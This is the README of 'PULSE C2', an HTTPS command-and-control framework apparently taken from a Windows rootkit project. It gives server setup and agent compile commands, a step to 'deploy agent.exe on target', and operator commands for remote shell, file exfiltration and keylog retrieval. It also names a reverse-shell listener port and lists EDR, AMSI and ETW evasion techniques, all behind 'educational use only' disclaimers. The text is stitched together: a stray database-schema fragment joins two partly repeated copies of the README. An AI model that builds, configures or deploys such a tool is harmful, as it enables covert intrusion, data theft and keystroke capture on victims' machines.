# PULSE C2 Framework

![C2 Project](https://img.shields.io/badge/Project-PULSE%20C2-red)
![Language](https://img.shields.io/badge/Python-3.9+-blue)
![Language](https://img.shields.io/badge/C++-17-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)
![License](https://img.shields.io/badge/License-Educational-yellow)

**HTTPS Command & Control infrastructure with web dashboard for remote agent management.**

Extracted from the [XvX Usermode Rootkit](https://github.com/28Zaaky/Usermode-Rootkit) project - a full-featured Windows rootkit with inline hooking, privilege escalation, and EDR evasion capabilities.

> **⚠️ Educational Use Only**  
> This C2 framework is for **security research and defensive learning purposes only**.  
> Unauthorized use on systems you don't own is **illegal and unethical**.

---

## ✨ Features

- **HTTPS C2 Server** - Flask-based with TLS encryption
- **Web Dashboard** - Real-time agent monitoring and control
- **XOR Encryption** - Custom protocol with Base64 encoding
- **SQLite Database** - Persistent agent/task/result storage
- **Command Execution** - Remote shell, file exfiltration, sleep control
- **Auto-Registration** - Agent fingerprinting with unique IDs
- **Cross-Platform Server** - Python runs on Windows/Linux/macOS
- **Production-Ready** - Silent agent with no debug output

## 📁 Project Structure

```
C2/
├── server/
│   ├── c2_server.py       # Flask HTTPS C2 server (140 KB)
│   ├── http_server.py     # HTTP payload delivery server
│   ├── cert.pem           # SSL certificate (auto-generated)
│   └── key.pem            # SSL private key
│
├── client/
│   └── c2_client.cpp      # Windows agent (production build)
│
├── include/
│   └── C2Client.h         # C++ client class
│
├── build.bat              # Windows compilation script
├── start_server.bat       # Server startup script
└── README.md              # This file
```

---

## 🚀 Quick Start

### **Server Setup**

**Windows:**
```cmd
start_server.bat
```

**Manual:**
```bash
cd server
pip install flask
python c2_server.py
```

**Access dashboard:** `https://localhost:8443`

---

### **Client Compilation**

**Windows (MinGW):**
```cmd
build.bat
```

**Manual:**
```bash
g++ -o agent.exe client/c2_client.cpp -I./include -lwinhttp -lws2_32 -std=c++17 -O2 -s -static-libgcc -static-libstdc++
```

**Configure C2 IP** - Edit [client/c2_client.cpp](client/c2_client.cpp) line 162:
```cpp
wstring c2ServerUrl = L"https://YOUR_SERVER_IP:8443";
```

---

### **Deployment**

1. Start C2 server
2. Compile agent with your server IP
3. Deploy `agent.exe` on target
4. Monitor dashboard for agent check-in

---

## 📡 C2 Commands

| Command | Syntax | Description |
|---------|--------|-------------|
| `shell` | `shell <cmd>` | Execute shell command via cmd.exe |
| `exfil` | `exfil <path>` | Exfiltrate file content (Base64) |
| `sleep` | `sleep <seconds>` | Change beacon interval |
| `ping` | `ping` | Test connectivity (returns PONG) |
| `die` | `die` | Terminate agent |

**Example (from dashboard):**
```
Command: shell
Argument: whoami
→ Execute
```

---

## 🔒 C2 Protocol

### **Encryption Scheme**

**XOR Key Generation:**
```
XOR_KEY = ComputerName + Username + "SecretKey2025"
Example: "DESKTOP-ABC123john.doeSecretKey2025"
```

**Encoding Stack:**

**Key Generation:**
```
XOR_KEY = ComputerName + Username + "SecretKey2025"
```

**Encryption:**
1. Data → UTF-8 encoding
2. XOR with dynamic key
3. Base64 encoding
4. HTTPS transmission

### **Beacon Format**

**Request (Agent → Server):**
```
agent_id|hostname|username|os_version
```

```
Plaintext → UTF-8 → XOR → Base64 → HTTPS
```

**Communication Flow:**
```
Agent                    C2 Server
  |                          |
  |--POST /api/checkin------>| (Beacon)
  |<--XOR+Base64 commands----| (Tasks)
  |                          |
  |--POST /api/result------->| (Results)
  |<--200 OK-----------------| (ACK)
```

---

## 🌐 Web Dashboard

**Access:** `https://localhost:8443`

**Features:**
- Real-time agent monitoring (online/offline status)
- Interactive command execution
- Command history with results
- Statistics dashboard
- Auto-refresh (5s interval)

**Sections:**
- **Agents** - List of registered agents with details
- **Commands** - Dropdown menu with argument input
- **Results** - Execution output with timestamps
- **Stats** - Active sessions, success rates

---

## 🗄️ Database

**SQLite Schema (c2.db):**

| Table | Purpose |
|-------|---------|
| `agents` | Registered agents (ID, hostname, IP, timestamps) |
| `tasks` | Command queue (pending/sent) |
| `results` | Execution results (command, status, output) |
| `keylogs` | Keystroke captures (requires full rootkit) |

---

## 🔗 Related Project

**Full Rootkit Features:**

For advanced capabilities (process/file/registry hiding, privilege escalation, keylogger, EDR evasion), check out the complete **[XvX Usermode Rootkit](https://github.com/28Zaaky/Usermode-Rootkit)** project.

**Additional features in full rootkit:**
- Inline hooking (x64 trampolines)
- DLL injection (CreateRemoteThread)
- Token stealing (SYSTEM escalation)
- NTDLL unhooking (EDR bypass)
- ETW/AMSI patching
- VM/Debugger detection
- Indirect syscalls
- Persistence mechanisms

---

## 📋 Requirements

**Server:**
- Python 3.9+
- Flask (`pip install flask`)
- OpenSSL (for SSL certificates)

**Client:**
- MinGW-w64 GCC 15.2+ or MSVC 2019+
- Windows SDK (WinHTTP.h)
- C++17 compiler

---

## 🛠️ Troubleshooting

**Agent not appearing in dashboard:**
- Verify server is running (`netstat -an | findstr 8443`)
- Check firewall rules (allow port 8443)
- Confirm agent IP matches server URL
- Review server logs for decryption errors

**Compilation errors:**
- Install MinGW-w64: https://www.mingw-w64.org/
- Add to PATH: `C:\mingw64\bin`
- Ensure WinHTTP linked: `-lwinhttp -lws2_32`

---

## ⚠️ Legal Disclaimer

**This project is for EDUCATIONAL and RESEARCH purposes only.**

By using this software, you agree to:
- Only test on systems you own or have explicit written authorization
- Comply with all applicable laws and regulations
- Accept full responsibility for your actions

**The author is NOT responsible for:**
- Misuse of this software
- Damage caused by unauthorized use
- Legal consequences of illegal activities

**Use responsibly and ethically.**

---

## 📧 Contact

**Author:** 28zaakypro@proton.me  
**Project:** PULSE C2 Framework  
**Rootkit:** [XvX Usermode Rootkit](https://github.com/28Zaaky/Usermode-Rootkit)

---

## 📄 License

**Educational Use Only**

Copyright (c) 2026

This software is provided for security research and educational purposes.

---

**For defensive cybersecurity training only.**
cleaned_text TEXT (interpreted)
timestamp TEXT
```

---

## 🔧 Configuration

### **Server Configuration**

Edit `c2_server.py`:
```python
HOST = "0.0.0.0"        # Bind to all interfaces
PORT = 8443             # HTTPS C2 port
SHELL_PORT = 4444       # Reverse shell listener
DB_PATH = "c2.db"       # Database file
```

### **Client Configuration**

Edit `c2_client_example.cpp`:
```cpp
wstring c2ServerUrl = L"https://192.168.1.100:8443";
```

Or in header `include/C2Client.h`:
```cpp
C2Client(const wstring &serverURL = L"https://127.0.0.1:8443")
```

### **Beacon Interval**

Default: 30 seconds

Change dynamically:
```bash
# From dashboard or API
command: sleep|60
```

---

## 🛡️ Security Features

### **HTTPS TLS**
- Self-signed certificates (cert.pem/key.pem)
- TLS 1.2+ encryption
- Certificate pinning disabled (accepts self-signed)

### **XOR Encryption**
- Dynamic key per agent (hostname + username)
- XOR cipher with Base64 encoding
- Protects against basic traffic inspection

### **Agent Fingerprinting**
- Unique AgentID = hex(ComputerName + Username)
- Session tracking via database
- Persistent agent state

---

## 📊 API Endpoints

### **POST /api/checkin**
Agent beacon + command retrieval

**Request:** XOR+Base64 encrypted beacon
**Response:** XOR+Base64 encrypted command list

### **POST /api/result**
Command execution results

**Request:** XOR+Base64 encrypted result
**Response:** HTTP 200 OK

### **POST /api/ping**
Connection test

**Response:** "PONG"

### **GET /api/agents**
List all registered agents (JSON)

### **GET /api/results**
List all command results (JSON)

### **GET /api/keylogs**
List all captured keystrokes (JSON)

### **POST /api/command**
Queue new command for agent

**Body:**
```json
{
    "agent_id": "74657374...",
    "command": "shell|whoami"
}
```

---

## 🔬 Technical Details

### **Client Architecture**

**C2Client.h Class:**
- `checkIn()`: Send beacon, receive commands
- `sendResult()`: Send execution results
- `setBeaconInterval()`: Adjust sleep time
- `setActive()`: Enable/disable beacon loop
- `isRunning()`: Check active status

**Encryption Functions:**
- `base64Encode()` / `base64Decode()`
- `xorEncrypt()` / `xorDecrypt()`

**HTTP Functions:**
- `httpRequest()`: WinHTTP wrapper with TLS
- Custom User-Agent: Chrome 120.0

### **Server Architecture**

**Flask Routes:**
- `/` → Dashboard (HTML template)
- `/api/checkin` → Beacon handler
- `/api/result` → Result collector
- `/api/command` → Task queuer
- `/api/agents` → Agent list (JSON)
- `/api/results` → Results list (JSON)
- `/api/keylogs` → Keylog list (JSON)

**Database Functions:**
- `init_db()`: Create tables
- Agent CRUD operations
- Task queue management
- Result storage

**Keylog Processing:**
- `clean_keylog()`: Interpret special keys
- Handles: BACKSPACE, DELETE, CAPSLOCK, ARROWS
- Cursor position tracking
- Text reconstruction

---

## 🚨 Detection Evasion (Full Rootkit Only)

- **Indirect Syscalls**: Bypass EDR hooks
- **API Hashing**: Hide IAT entries
- **NTDLL Unhooking**: Fresh ntdll.dll loading
- **ETW/AMSI Bypass**: Patch telemetry
- **Jitter Sleep**: Randomized beacon intervals
- **String Obfuscation**: Compile-time encryption

---

## 📝 Usage Example

### **1. Start Server**
```bash
python server/c2_server.py
```

### **2. Access Dashboard**
```
https://localhost:8443
```

### **3. Deploy Agent**
```bash
agent.exe
```

### **4. Execute Commands**
From dashboard:
```
Command: shell
Argument: whoami
→ Execute
```

### **5. View Results**
Results appear in real-time in the Results table.

---

## 🔗 Integration with Full Rootkit

This C2 framework is **extracted** from the full XvX Usermode Rootkit project.

To integrate with the rootkit:
1. Include `C2Client.h` in your main.cpp
2. Initialize `C2Client *g_c2Client = new C2Client(url)`
3. Start beacon thread: `CreateThread(..., c2BeaconThread, ...)`
4. Implement command handlers (see `c2_client_example.cpp`)

---

## 📚 Dependencies

### **Server**
- Python 3.9+
- Flask 2.0+
- SQLite3 (built-in)
- OpenSSL (for certificate generation)

### **Client**
- MinGW-w64 GCC 15.2+ or MSVC 2019+
- Windows SDK (WinHTTP.h)
- C++17 standard

---

## 🐛 Troubleshooting

### **Problem: Agent not appearing in dashboard**

**Solutions:**
1. Check network connectivity (ping C2 server)
2. Verify SSL certificate acceptance
3. Check XOR key synchronization (hostname/username match)
4. Enable debug output in client
5. Check firewall rules (port 8443)

### **Problem: Commands not executing**

**Solutions:**
1. Verify agent status (last_seen < 2.5 minutes)
2. Check beacon interval (default 30s)
3. Review server logs for errors
4. Ensure command syntax is correct

### **Problem: SSL certificate errors**

**Solutions:**
1. Regenerate certificates: `openssl req -x509 ...`
2. Disable certificate validation in client (already done)
3. Use HTTP instead (not recommended for production)

---

## 📖 Learning Resources

- **MITRE ATT&CK**: T1071.001 (C2 over Web Service)
- **WinHTTP API**: Microsoft Docs
- **Flask Security**: OWASP Best Practices
- **XOR Encryption**: Practical Cryptography

---

## ⚠️ Legal Disclaimer

This project is for **educational and research purposes only**.

**You are solely responsible for:**
- Complying with all applicable laws and regulations
- Obtaining proper authorization before testing on any system
- Understanding the ethical and legal implications

**The author is NOT responsible for:**
- Misuse of this software
- Damage caused by unauthorized use
- Legal consequences of illegal activities

---

## 📧 Contact

**Author:** 28zaakypro@proton.me

**Repository:** XvX Usermode Rootkit (Private)

**License:** Educational Use Only

---

## 🎓 Acknowledgments

This C2 framework demonstrates:
- Real-world malware C2 architecture
- HTTPS-based covert channels
- Client-server encryption schemes
- Agent tasking and result collection
- Web-based operator interfaces

**For defensive research only.**
